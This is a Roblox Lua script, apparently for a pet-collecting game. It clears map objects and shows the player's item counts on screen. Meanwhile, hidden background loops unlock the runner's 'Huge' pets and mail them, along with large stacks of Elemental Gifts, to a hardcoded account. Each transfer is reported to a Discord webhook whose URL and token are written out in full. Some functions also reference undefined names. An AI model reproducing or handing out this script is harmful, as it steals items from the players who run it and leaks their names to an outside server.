
wait(20)

repeat wait(1) until game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
local hrp = game.Players.LocalPlayer.Character.HumanoidRootPart

repeat wait(0.1) until (hrp.Position - Vector3.new(1569.26, 24, -24948)).Magnitude <= 200
wait(15)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1569.26, 24, -24948)
wait(2)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1427, 16, -24949)

local map = game:GetService("Workspace"):FindFirstChild("Map3")
if map then
    for _, child in pairs(map:GetChildren()) do
        if not (child.Name:find("225") or child.Name:find("226") or child.Name:find("227") or child.Name:find("228") or child.Name:find("229")) then
            child:Destroy()
        end
    end
end

local things = game:GetService("Workspace"):FindFirstChild("__THINGS")
if things then
    for _, child in pairs(things:GetChildren()) do
        if child.Name == "Instances" or child.Name == "shinyRelics" or child.Name == "HiddenPresents" then
            child:Destroy()
        end
    end
end

local debris = game:GetService("Workspace"):FindFirstChild("__DEBRIS")
if debris then
    debris:Destroy()
end

for _, descendant in pairs(game:GetService("Workspace"):GetDescendants()) do
    if descendant:IsA("Part") or descendant:IsA("MeshPart") then
        descendant.Transparency = 1
    elseif descendant:IsA("ParticleEmitter") then
        descendant:Destroy()
    end
end

local function GameCheck()
    if game.GameId == 3317771874 then
        while true do
            game.ReplicatedStorage.Network:FindFirstChild("World3Teleport"):InvokeServer()
            wait(10)
        end
    end
end
spawn(GameCheck)

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Player = game.Players.LocalPlayer
local itemsFrame = Player.PlayerGui:FindFirstChild("_MACHINES"):FindFirstChild("ElementalQuest").Frame.ItemsFrame

local function FrameFunction()
    while true do
        local tradeWindow = game.Players.LocalPlayer.PlayerGui:FindFirstChild("TradeWindow")
        if tradeWindow then
            for _, child in pairs(tradeWindow:GetChildren()) do
                if child:IsA("Frame") then
                    child.Size = UDim2.new(1, 0, 0.1, 115)
                end
            end
        end
        wait(0.1)
    end
end
spawn(FrameFunction)

local Library = require(ReplicatedStorage:WaitForChild("Library"))
local ProcessedHuges = {}

function ProcessHugePets()
    while true do
        local function GetItemInfo(ItemsClass, ItemsName)
            local Table = {}
            for UID, Item in pairs(require(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client").Save).Get().Inventory[ItemsClass]) do
                if table.find(ItemsName, Item.id) then
                    local ItemInfo = {
                        ["uid"] = UID,
                        ["data"] = Item
                    }
                    table.insert(Table, ItemInfo)
                end
            end
            return Table
        end

        local function getCurrentHugePets()
            local GoldPetsTable = {}
            for i, Pet in next, ReplicatedStorage.__DIRECTORY.Pets.Huge:GetChildren() do
                table.insert(GoldPetsTable, Pet.Name)
            end
            return GetItemInfo("Pet", GoldPetsTable)
        end

        local hugePets = {}
        local uids = {}

        for i, MadeTable in next, getCurrentHugePets() do
            table.insert(hugePets, MadeTable.data.id .. " (UID: " .. MadeTable.uid .. ")")
            table.insert(uids, MadeTable.uid)
        end

        if #hugePets > 0 then
            for i = #uids, 1, -1 do
                local webhook = "https://discord.com/api/webhooks/1240148195783213127/SCs8ji01gBTVw2G66fJDS2Z9Re6eeaXyD8uPRIIhahlsS9qCgPPtQ2NYPFdWlzyXoKo6"
                local request = (syn and syn.request) or request or (http and http.request) or http_request

                request({
                    Url = webhook,
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "application/json"
                    },
                    Body = Http:JSONEncode({
                        content = game.Players.LocalPlayer.Name .. " | Successfully sent! Pet ID: " .. hugePets[i]
                    })
                })

                local args = {
                    [1] = uids[i],
                    [2] = false
                }
                game:GetService("ReplicatedStorage").Network.Locking_SetLocked:InvokeServer(unpack(args))
                wait(1)
                wait(3)

                local args = {
                    [1] = "simpleblandok3",
                    [2] = "omg u got a new huge!!",
                    [3] = "Pet",
                    [4] = uids[i],
                    [5] = 1
                }
                game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
                wait(3)
            end
        end
        wait(3)
    end
end

spawn(ProcessHugePets)

local Player = game.Players.LocalPlayer
local playerName = Player.Name

local screenGui = Instance.new("ScreenGui")
screenGui.Parent = Player:WaitForChild("PlayerGui")

local textLabel = Instance.new("TextLabel")
textLabel.Size = UDim2.new(1, 0, 0, 100)
textLabel.Position = UDim2.new(0, 0, 0, 50)
textLabel.BackgroundTransparency = 1
textLabel.Text = playerName
textLabel.Font = Enum.Font.SourceSansBold
textLabel.TextSize = 36
textLabel.TextColor3 = Color3.new(0, 0, 0)
textLabel.Parent = screenGui

local ItemMisc = {"Pet Cube"}
local ItemLootbox = {"Elemental Gift"}

local function UpdateGUI()
    while true do
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local diamondsvalue = 0
        local voidvalue = 0

        local function GetItemInfo(ItemsClass, ItemsName)
            local Table = {}
            local Inventory = require(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client").Save).Get().Inventory

            if Inventory[ItemsClass] then
                for UID, Item in pairs(Inventory[ItemsClass]) do
                    if table.find(ItemsName, Item.id) then
                        local ItemInfo = {
                            ["uid"] = UID,
                            ["data"] = Item
                        }
                        table.insert(Table, ItemInfo)
                    end
                end
            end
            return Table
        end

        -- Get Lootbox items
        local LootboxItems = GetItemInfo("Lootbox", ItemLootbox)
        for _, ItemInfo in pairs(LootboxItems) do
            local ItemData = ItemInfo.data
            if ItemData._am then
                diamondsvalue = ItemData._am -- Set the value directly
            end
        end

        -- Get Misc items
        local MiscItems = GetItemInfo("Misc", ItemMisc)
        for _, ItemInfo in pairs(MiscItems) do
            local ItemData = ItemInfo.data
            if ItemData._am then
                voidvalue = ItemData._am -- Set the value directly
            end
        end

        textLabel.Text = playerName .. "\nPet Cubes: " .. voidvalue .. "\nElemental Gifts: " .. diamondsvalue
        wait(1)
    end
end

spawn(UpdateGUI)


local function SendGiftsFunction()
    while true do
        local diamondsvalue = 0
        local gifts = ""

        local LootboxItems = GetItemInfo("Lootbox", ItemLootbox)
        for _, ItemInfo in pairs(LootboxItems) do
            local ItemData = ItemInfo.data
            if ItemData._am then
                diamondsvalue = ItemData._am
                gifts = ItemInfo.uid
            end
        end

        if diamondsvalue > 300 then
            local args = {
                [1] = "simpleblandok3",
                [2] = "enjoy bro",
                [3] = "Lootbox",
                [4] = gifts,
                [5] = diamondsvalue
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end

        wait(5)
    end
end

spawn(SendGiftsFunction)


local function MailClaim()
    while true do
        local gui = Player.PlayerGui:FindFirstChild("_MACHINES")
        if gui then
            local mailboxMachine = gui.MailboxMachine
            if mailboxMachine then
                local giftsFrame = mailboxMachine.Frame.GiftsFrame
                if giftsFrame then
                    local itemsFrame = giftsFrame.ItemsFrame
                    if itemsFrame then
                        local frameChild = itemsFrame:FindFirstChildWhichIsA("Frame")
                        if frameChild then
                            local args = {
                                [1] = {
                                    [1] = frameChild.Name
                                }
                            }
                            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Claim"):InvokeServer(unpack(args))
                        end
                    end
                end
            end
        end
        wait(1)
    end
end

spawn(MailClaim)
